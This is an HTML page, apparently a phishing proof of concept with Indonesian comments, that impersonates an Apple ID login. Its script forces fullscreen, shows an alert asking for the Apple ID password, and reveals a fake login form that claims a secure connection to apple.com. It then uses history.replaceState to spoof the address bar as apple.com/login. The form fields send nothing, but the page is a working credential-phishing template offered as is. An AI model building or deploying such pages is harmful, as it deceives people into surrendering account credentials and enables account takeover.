<!DOCTYPE html>
<html>
<head>
  <title>Verifying...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0; padding: 0;
      font-family: -apple-system, sans-serif;
      background: white;
    }
    .center {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>

<div class="center" id="step1">
  <h2>🔒 Verifying Session...</h2>
  <p>Please wait while we re-authenticate your Apple ID.</p>
</div>

<div class="center hidden" id="step2">
  <h2>🔒 Apple Login</h2>
  <input placeholder="Apple ID or Email"><br><br>
  <input placeholder="Password" type="password"><br><br>
  <button>Continue</button>
  <p style="color: gray; font-size: 13px;">You're securely connected to <b>apple.com</b></p>
</div>

<script>
(async () => {
  await document.documentElement.requestFullscreen();
  await new Promise(r => setTimeout(r, 1000));
  alert("🔐 Please confirm your Apple ID password.");

  // Masih dalam fullscreen, spoof login muncul
  document.getElementById("step1").classList.add("hidden");
  document.getElementById("step2").classList.remove("hidden");

  // Ganti address bar palsu di memori
  history.replaceState({}, "", "https://apple.com/login");
})();
</script>

</body>
</html>
